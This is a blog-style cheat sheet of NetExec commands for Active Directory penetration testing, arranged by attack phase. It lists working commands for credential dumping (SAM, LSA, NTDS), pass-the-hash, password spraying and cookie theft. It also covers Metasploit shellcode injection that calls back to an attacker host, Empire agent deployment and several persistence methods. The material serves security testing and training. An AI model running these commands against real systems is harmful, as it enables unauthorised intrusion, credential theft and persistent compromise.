---
layout: post
title: Netexec CheatSheet
date: 30-06-2025
categories: [CheatSheet]
tag: [Red Team, Pentest, AD]
---

# Netexec/nxc CheatSheet:

Below is a **comprehensive table of NetExec (nxc) commands**, organized by the main phases of a typical penetration test: **Enumeration, Credential Access, Exploitation, Lateral Movement, Post-Exploitation, and Persistence**. This table is designed for quick reference and covers the most relevant options and modules for each phase[^1][^2][^3].

## NetExec / nxc Command Table by Phase

| **Phase** | **Command / Option** | **Description** | **Example** |
| :-- | :-- | :-- | :-- |
| **Enumeration** | `nxc smb <target>` | Basic SMB enumeration | `nxc smb 10.0.0.5` |
|  | `--shares` | List SMB shares | `nxc smb 10.0.0.5 --shares` |
|  | `--users` | Enumerate users | `nxc smb 10.0.0.5 --users` |
|  | `--groups` | Enumerate groups | `nxc smb 10.0.0.5 --groups` |
|  | `--computers` | List computers | `nxc smb 10.0.0.5 --computers` |
|  | `--sessions` | List active SMB sessions | `nxc smb 10.0.0.5 --sessions` |
|  | `--disks` | List disks | `nxc smb 10.0.0.5 --disks` |
|  | `--loggedon-users` | List logged-on users | `nxc smb 10.0.0.5 --loggedon-users` |
|  | `--pass-pol` | Show password policy | `nxc smb 10.0.0.5 --pass-pol` |
|  | `--rid-brute` | RID brute-force for user discovery | `nxc smb 10.0.0.5 --rid-brute` |
|  | `ldap` protocol | AD enumeration (users, groups, etc.) | `nxc ldap 10.0.0.5 -u user -p pass --users` |
|  | `-M bloodhound` | Collect BloodHound data | `nxc ldap 10.0.0.5 -u user -p pass -M bloodhound` |
|  | `-M enum_dns` | Dump DNS from AD DNS server | `nxc smb 10.0.0.5 -u user -p pass -M enum_dns` |
|  | `-M enum-avproducts` | Enumerate installed AV/EDR products | `nxc smb 10.0.0.5 -u user -p pass -M enum-avproducts` |
|  | `ftp` protocol | List files/directories | `nxc ftp 10.0.0.5 -u user -p pass --ls` |
| **Credential Access** | `-u <USERNAME> -p <PASSWORD>` | Basic authentication | `nxc smb 10.0.0.5 -u admin -p 'Password123!'` |
|  | `-H <LM:NT>` | Pass-the-hash | `nxc smb 10.0.0.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash` |
|  | `-U <userfile> -P <passfile>` | User/password spraying | `nxc smb 10.0.0.5 -U users.txt -P passwords.txt` |
|  | `--lsa` | Dump LSA secrets | `nxc smb 10.0.0.5 -u admin -p pass --lsa` |
|  | `--sam` | Dump SAM database | `nxc smb 10.0.0.5 -u admin -p pass --sam` |
|  | `--ntds` | Dump NTDS.dit (domain hashes) | `nxc smb 10.0.0.5 -u admin -p pass --ntds` |
|  | `-M gpp_password` | Dump Group Policy Preferences passwords | `nxc smb 10.0.0.5 -u admin -p pass -M gpp_password` |
|  | `--laps` | Retrieve LAPS passwords | `nxc smb 10.0.0.5 -u admin -p pass --laps` |
|  | `-M keypass_discover` | Search for KeePass files | `nxc smb 10.0.0.5 -u admin -p pass -M keypass_discover` |
|  | `-M msol` | Retrieve MSOL account password | `nxc smb 10.0.0.5 -u admin -p pass -M msol` |
| **Exploitation** | `-x <cmd>` | Execute command (CMD) | `nxc smb 10.0.0.5 -u admin -p pass -x whoami` |
|  | `-X <pscmd>` | Execute PowerShell command | `nxc smb 10.0.0.5 -u admin -p pass -X '$PSVersionTable'` |
|  | `-M empire_exec -o LISTENER=<listener>` | Deploy Empire agent | `nxc smb 10.0.0.5 -u admin -p pass -M empire_exec -o LISTENER=http` |
|  | `-M met_inject -o LHOST=<attacker> LPORT=<port>` | Inject Metasploit shellcode | `nxc smb 10.0.0.5 -u admin -p pass -M met_inject -o LHOST=10.0.0.1 LPORT=4444` |
|  | `--get-file <remote> <local>` | Download file from target | `nxc smb 10.0.0.5 -u admin -p pass --get-file \\C$\creds.txt creds.txt` |
|  | `--put-file <local> <remote>` | Upload file to target | `nxc smb 10.0.0.5 -u admin -p pass --put-file shell.exe \\C$\Temp\shell.exe` |
| **Lateral Movement** | `-M rdp` | Enable RDP on target | `nxc smb 10.0.0.5 -u admin -p pass -M rdp` |
|  | `-M impersonate` | List tokens for privilege escalation | `nxc smb 10.0.0.5 -u admin -p pass -M impersonate` |
|  | `-M install_elevated` | Check for AlwaysInstallElevated privilege | `nxc smb 10.0.0.5 -u admin -p pass -M install_elevated` |
|  | `-M get_netconnections` | Get current network connections | `nxc smb 10.0.0.5 -u admin -p pass -M get_netconnections` |
|  | `mssql` protocol | Lateral movement via MSSQL | `nxc mssql 10.0.0.5 -u sa -p pass -x whoami` |
| **Post-Exploitation** | `--sessions` | List active sessions | `nxc smb 10.0.0.5 -u admin -p pass --sessions` |
|  | `--local-groups` | List local groups | `nxc smb 10.0.0.5 -u admin -p pass --local-groups` |
|  | `-M enum_dns` | Dump DNS from AD DNS server | `nxc smb 10.0.0.5 -u admin -p pass -M enum_dns` |
|  | `-M enum-avproducts` | List installed AV/EDR | `nxc smb 10.0.0.5 -u admin -p pass -M enum-avproducts` |
|  | `-M teams_localdb` | Steal Teams cookies | `nxc ldap 10.0.0.5 -u admin -p pass -M teams_localdb` |
|  | `rdp` protocol | Take screenshot via RDP | `nxc rdp 10.0.0.5 -u admin -p pass --screenshot` |
| **Persistence** | `--x 'schtasks ...'` | Create scheduled task for persistence | `nxc smb 10.0.0.5 -u admin -p pass --x 'schtasks /create ...'` |
|  | `--x 'reg add ...'` | Registry run key persistence | `nxc smb 10.0.0.5 -u admin -p pass --x 'reg add ...'` |
|  | `--put-file <PAYLOAD> "%APPDATA%\\...\\Startup\\<PAYLOAD>"` | Startup folder persistence | `nxc smb 10.0.0.5 -u admin -p pass --put-file shell.exe "%APPDATA%\\...\\Startup\\shell.exe"` |
|  | `--x 'sc create ...'` | Install service for persistence | `nxc smb 10.0.0.5 -u admin -p pass --x 'sc create ...'` |
| **Advanced/Other** | `-L` | List available modules for protocol | `nxc smb -L` |
|  | `--obfs` | Obfuscate PowerShell commands | `nxc smb 10.0.0.5 -u admin -p pass -X '<pscmd>' --obfs` |
|  | `--bloodhound --collection All` | Run BloodHound collector | `nxc ldap 10.0.0.5 -u admin -p pass --bloodhound --collection All` |
|  | `nxcdb` | Interact with NetExec database | `nxcdb` |
|  | `workspace create <name>` | Create new workspace | `nxcdb (default) > workspace create pentest1` |
|  | `workspace <name>` | Switch workspace | `nxcdb (default) > workspace pentest1` |

**Notes:**

- Replace `<target>`, `<USERNAME>`, `<PASSWORD>`, `<listener>`, `<attacker>`, `<PAYLOAD>`, etc., with your actual values.
- Many commands can be chained, e.g., `nxc smb 10.0.0.5 -u admin -p pass --sam --lsa --dpapi`[^3].
- Use `-h` or `--help` after any protocol or module for more options.

**References:**

- [StationX NetExec Cheat Sheet](https://www.stationx.net/netexec-cheat-sheet/)[^1]
- [Ben Heater’s NetExec Notes](https://notes.benheater.com/books/active-directory/page/netexec)[^2]
- [NetExec Wiki](https://www.netexec.wiki)[^4]
- [seriotonctf/cme-nxc-cheat-sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)[^3]
- [NetExec Database Usage](https://www.netexec.wiki/getting-started/database-general-usage)[^5]
- https://www.linkedin.com/posts/housenathan_netexec-cheat-sheet-essential-commands-activity-7300440179683610624-WxmG
- https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/
- https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-shares/
- https://research.splunk.com/endpoint/adbff89c-c1f2-4a2e-88a4-b5e645856510/
- https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/selecting-and-using-a-protocol.md

